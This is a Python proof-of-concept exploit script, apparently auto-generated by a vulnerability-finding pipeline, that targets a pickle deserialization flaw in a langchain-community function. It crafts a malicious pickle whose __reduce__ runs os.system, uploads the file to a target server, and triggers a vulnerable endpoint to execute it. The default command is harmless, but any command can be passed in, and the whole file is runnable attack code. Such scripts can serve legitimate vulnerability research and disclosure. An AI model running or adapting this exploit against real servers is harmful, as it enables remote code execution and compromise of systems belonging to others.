#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-020
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_python_code_when_loaded__send_pipeline_to_device.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only
Vulnerability: Unsafe pickle.load() via user-controlled pipeline path

The vulnerable function _send_pipeline_to_device opens a file if `pipeline`
is a string and calls pickle.load() on it. An attacker who can control the
pipeline parameter can trigger arbitrary code execution by providing a path
to a malicious pickle file.

This script:
1. Creates a malicious pickle file that executes a benign command.
2. Uploads the pickle file to the target server (if a file upload endpoint is given).
3. Sends a request to the vulnerable endpoint with the path to the pickle file.
4. Verifies the payload was executed (if possible).

Usage:
    python exploit.py --target http://victim:8000 \
                      --upload-endpoint /api/v1/upload \
                      [--output-path /tmp/exploit.pkl]
"""

import argparse
import os
import pickle
import requests
import sys
import tempfile
import time

# ---------------------------------------------------------------------------
# Step 1: Create a malicious pickle payload
# ---------------------------------------------------------------------------
def create_malicious_pickle(command="touch /tmp/poc_success.txt"):
    """
    Build a pickle that runs the given command when unpickled.
    The payload uses __reduce__ to execute a subprocess call.
    """
    class Exploit:
        def __reduce__(self):
            # Return (callable, args) that will be executed during unpickling
            return (os.system, (command,))
    return pickle.dumps(Exploit())

# ---------------------------------------------------------------------------
# Step 2: Upload the malicious pickle file to the server
# ---------------------------------------------------------------------------
def upload_pickle(server_url, upload_endpoint, pickle_data, filename="exploit.pkl"):
    """
    Upload pickle_data to the server using a file upload endpoint.
    Assumes the endpoint accepts a file in a multipart form field.
    Returns the path to the uploaded file on the server, or None on failure.
    """
    url = server_url.rstrip("/") + upload_endpoint
    try:
        files = {"file": (filename, pickle_data, "application/octet-stream")}
        resp = requests.post(url, files=files, timeout=10)
        resp.raise_for_status()
        # Try to extract the path from response (common patterns: JSON, plain text)
        if resp.headers.get("content-type", "").startswith("application/json"):
            answer = resp.json()
            if "path" in answer:
                return answer["path"]
            elif "file_path" in answer:
                return answer["file_path"]
            else:
                print("[!] Upload response JSON does not contain path:", answer)
                return None
        else:
            # Assume plain text response is the path
            return resp.text.strip()
    except requests.exceptions.RequestException as e:
        print(f"[!] Upload failed: {e}")
        return None

# ---------------------------------------------------------------------------
# Step 3: Trigger the vulnerable endpoint with the pickle path
# ---------------------------------------------------------------------------
def trigger_vulnerable_endpoint(server_url, pipeline_path):
    """
    Send a POST request to /api/v1/trigger with the pipeline parameter set
    to the path of the malicious pickle file.
    The endpoint is expected to call _send_pipeline_to_device(pipeline_path).
    """
    url = server_url.rstrip("/") + "/api/v1/trigger"
    # The exact parameter name may vary; assume it's "pipeline" based on finding.
    # The wrapper shows: handle_request(untrusted_user_input) passes it through.
    # We'll send "pipeline" as the parameter.
    data = {"pipeline": pipeline_path}
    try:
        resp = requests.post(url, data=data, timeout=10)
        # The execution happens server-side; the response may be irrelevant.
        print(f"[*] Triggered endpoint, status code: {resp.status_code}")
        return resp.text
    except requests.exceptions.RequestException as e:
        print(f"[!] Failed to trigger endpoint: {e}")
        return None

# ---------------------------------------------------------------------------
# Step 4: Verify payload execution (if we have shell access or a timer)
# ---------------------------------------------------------------------------
def check_payload_success(server_url=None, test_file="/tmp/poc_success.txt"):
    """
    Verify that the benign command created the test file.
    If running locally, check directly. Otherwise, you could attempt to
    fetch a status endpoint, but that's beyond the scope.
    """
    if os.path.exists(test_file):
        print(f"[+] Payload executed successfully! Found {test_file}")
        return True
    else:
        # If remote, we cannot check directly; inform the user.
        print(f"[?] Cannot verify remote execution of {test_file} directly.")
        print("[?] Check your target manually for evidence.")
        return False

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community pickle RCE"
    )
    parser.add_argument(
        "--target", required=True,
        help="Base URL of the target server (e.g., http://192.168.1.100:8000)"
    )
    parser.add_argument(
        "--upload-endpoint", default=None,
        help="File upload endpoint on the server (e.g., /api/v1/upload). "
             "If not provided, the script assumes the pickle file is already "
             "present on the server at a known path (use --pipeline-path)."
    )
    parser.add_argument(
        "--pipeline-path", default=None,
        help="Path to the malicious pickle file on the server. "
             "Required if --upload-endpoint is not used."
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (safe by default)."
    )
    args = parser.parse_args()

    # Create the malicious pickle data
    print("[*] Creating malicious pickle...")
    pickle_data = create_malicious_pickle(args.command)
    print(f"[*] Pickle payload size: {len(pickle_data)} bytes")

    # Determine the pipeline path to use
    if args.upload_endpoint:
        print(f"[*] Uploading pickle to {args.target}{args.upload_endpoint} ...")
        pipeline_path = upload_pickle(args.target, args.upload_endpoint, pickle_data)
        if not pipeline_path:
            print("[!] Upload failed; cannot proceed.")
            sys.exit(1)
        print(f"[+] Pickle uploaded; server path: {pipeline_path}")
    elif args.pipeline_path:
        pipeline_path = args.pipeline_path
        print(f"[*] Using provided pipeline path: {pipeline_path}")
    else:
        print("[!] Either --upload-endpoint or --pipeline-path must be specified.")
        sys.exit(1)

    # Trigger the vulnerable endpoint
    print("[*] Triggering vulnerable endpoint /api/v1/trigger ...")
    response_text = trigger_vulnerable_endpoint(args.target, pipeline_path)

    # Brief pause to let the command execute (if remote, timing may vary)
    time.sleep(0.5)

    # Check results (only works if we have local filesystem, otherwise just info)
    check_payload_success()

    print("[*] Exploit attempt completed.")
    print("[*] If successful, the command was executed on the server.")

if __name__ == "__main__":
    main()
